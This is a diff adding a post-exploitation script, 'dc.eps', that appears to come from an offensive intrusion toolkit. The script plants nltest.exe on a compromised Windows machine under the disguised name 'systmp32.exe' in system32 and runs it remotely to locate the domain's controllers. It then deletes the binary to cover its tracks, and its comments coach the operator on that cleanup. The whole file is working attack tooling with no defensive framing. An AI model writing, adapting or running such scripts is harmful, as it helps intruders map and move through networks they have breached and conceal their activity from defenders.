@@ -1,0 +1,137 @@
+#-------------------------------------------------------------------------------
+# File: dc.eps
+# Description: Finds the target machines domain controllers.
+# 			Puts nltest.exe up on the target in c:winnt\system32,
+#			runs it on the target, and deletes nltest from the target
+#			when it is done.  Sweet tool.
+#
+#-------------------------------------------------------------------------------
+bool $showUsage = false;
+bool $success = true;
+
+string $tempPath="C:\\winnt\\system32";
+string $domName;
+string $tmpFile = "systmp32.exe";
+
+if ($argc < 2){
+	$showUsage = true;
+	$success = false;
+} else if ($argv[1] == "?") {
+    $showUsage = true;
+} else if ($argc > 4) {
+    $showUsage = true;
+    $success = false;
+} 
+
+if ($showUsage) {
+    echo "Usage: $argv[0] <domain name> [<temp path> <temp file name>]";
+    echo "Will return the IP address of the Domain Controller.";
+    return $success;
+}
+
+bool $badParams = false;
+
+if ($argc > 4) {
+    $badParams = true;
+} else {
+	if ($argv[1] == "?") {
+		$badParams=true;
+	}
+
+	$domName = $argv[1];
+	echo "Domain: $domName";
+
+	if ($argc >= 3){
+		$temppath=$argv[2];
+		echo "Temp Path: $temppath";
+	}
+	if ($argc >= 4){
+		$tmpFile = $argv[3];
+		echo "Temp File: $tmpFile";
+	}
+}
+
+if ($badParams) {
+    echo "Usage: $argv[0] <domain name> [<temp path> <temp file name>]";
+    echo "What it does:";
+    echo "    Finds the domain controller by putting up nltest.exe";
+    echo "    - The executable will be put in <temp path> <temp file name>, if provided";
+    echo "    Runs nltest.exe on the target machine, piping the results back";
+    echo "    Deletes nltest.exe from the target box.";
+    echo "    ";
+
+    if ($argc > 1) {
+	if ($argv[1] == "?") {
+	    return true;
+	}
+    }
+
+    return false;
+}
+
+######## Put up nltest
+
+echo "Putting up nltest as $temppath\\$tmpFile.";
+
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:\\resources\\ep\\scripts";
+}
+@record off;
+@echo on;
+
+ifnot (`dir $tmpFile -path "$temppath"`) {
+	ifnot (`put "$ScriptsDir\\..\\..\\..\\Tools\\nltest.exe" -name "$temppath\\$tmpFile"`) {
+		echo "!!! Could not put nltest.exe in $temppath !!!";
+		return false;
+	} else {
+		if (`script checksum.eps nltest.exe "$ScriptsDir\\..\\..\\..\\Tools" "$tmpFile" "$temppath"`) {
+			echo "Successful put of nltest.exe as $temppath\\$tmpFile";
+		} else {
+			echo "Checksum of remote file does not match!!  Bailing!!!";
+			echo "Delete the corrupted version if you just put it up.  Don't delete if it existed beforehand.";
+			echo "(It probably was just corrupted somehow on the way up)";
+			if (prompt "Delete the remote (corrupted) version of nltest?") {
+				ifnot (`del "$tmpFile" -path "$temppath"`) {
+					echo "!!! Failed to del $tmpFile!";
+					pause;
+				}
+			}
+			return false;
+		}
+	}
+} else {
+	echo "!!! $tmpFile already exists in $temppath, use a different name !!!";
+	return false;
+}
+echo "REMEMBER!  If you quit before the script finishes, make sure to del \"$tmpFile\" -path \"$temppath\"";
+
+######## Run nltest on the target.
+
+#ifnot (`run -command "$temppath\\$tmpFile /DCLIST:$domName" -redirect dclist`){
+#	echo "Could not run nltest on the target.";
+#}
+#ifnot (`run -command "$temppath\\$tmpFile /DCNAME:$domName" -redirect dcname`){
+#	echo "Could not run nltest on the target.";
+#}
+ifnot (`run -command "$temppath\\$tmpFile /DSGETDC:$domName" -redirect dsgetdc`){
+	echo "Could not run nltest on the target.";
+}
+#ifnot (`run -command "$temppath\\$tmpFile /BDC_QUERY:$domName" -redirect bdc_query`){
+#	echo "Could not run nltest on the target.";
+#}
+
+
+######## Del nltest from the target.
+
+ifnot (`del "$tmpFile" -path "$temppath"`) {
+	echo "!!! Failed to del $tmpFile!";
+	pause;
+}
+
+return true;
